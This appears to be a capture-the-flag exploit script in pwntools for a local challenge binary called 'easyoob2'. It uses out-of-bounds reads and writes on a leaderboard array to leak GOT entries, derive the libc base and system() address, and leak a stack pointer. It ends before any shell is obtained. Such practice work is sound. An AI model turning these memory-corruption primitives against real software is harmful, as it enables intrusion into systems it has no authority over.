from pwn import *

r = process("./easyoob2")

def leak(index):
    r.sendlineafter("\n> ", f"1 {index}")
    entry = r.recvline().split()
    print(entry)
    leaked = u32(entry[1][:4])
    return leaked + (int(entry[2]) << 32)

def leak_from_addr(addr):
    LEADERBOARD_ADDR = 0x4040a0
    index = (addr - LEADERBOARD_ADDR) // 8
    print("index is", index)
    return leak(index)

def clearbuf():
    r.sendlineafter("\n> ", b"2 1 BBB 1234")

def write(index, val):
    clearbuf()
    PAYLOAD = b"2 " + str(index).encode() + b" " + p32(val & 0xffffffff).replace(b"\x00", b"") + b" " + str(val >> 32).encode()
    print(PAYLOAD)
    r.sendlineafter("\n> ", PAYLOAD)

pause()

SCANF_GOT = leak(-0xc)
print(f"SCANF_GOT: {SCANF_GOT:#x}")
PRINTF_GOT = leak(-0xe)
print(f"PRINTF_GOT: {PRINTF_GOT:#x}")

LIBC_BASE = SCANF_GOT - 0x66230
print(f"LIBC_BASE: {LIBC_BASE:#x}")

SYSTEM = LIBC_BASE + 0x55410
print(f"SYSTEM: {SYSTEM:#x}")

### leak stack
PROGRAM_SHORT_NAME_OFFSET = 0x00000000001ec440      # program_invocation_short_name, points to the stack
PROGRAM_SHORT_NAME = LIBC_BASE + PROGRAM_SHORT_NAME_OFFSET
print(f"PROGRAM_SHORT_NAME: {PROGRAM_SHORT_NAME:#x}")

STACK_ADDR = leak_from_addr(PROGRAM_SHORT_NAME)
print(f"STACK_ADDR: {STACK_ADDR:#x}")

